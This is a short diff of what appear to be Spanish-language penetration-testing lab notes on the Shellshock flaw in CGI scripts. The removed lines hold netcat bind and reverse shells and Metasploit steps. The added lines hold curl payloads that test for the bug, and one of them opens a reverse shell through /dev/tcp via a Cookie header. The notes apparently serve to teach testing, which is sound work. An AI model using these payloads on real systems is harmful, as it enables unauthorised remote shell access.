@@ -738,16 +738,11 @@ vamos a seguir realizando las pruebas para identificar cual de las vulnerabilida
 ![[Pasted image 20240622194632.png]]
 
 ```python
-#Bind Shell
-$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
-#Reverse shell
-$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
-#Reverse shell using curl
-curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
-#Reverse shell using metasploit
-> use multi/http/apache_mod_cgi_bash_env_exec
-> set targeturi /cgi-bin/admin.cgi
-> set rhosts 10.1.2.11
-> run
+# Reflected
+curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
+# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
+curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
+# Out-Of-Band Use Cookie as alternative to User-Agent
+curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
 ```
 
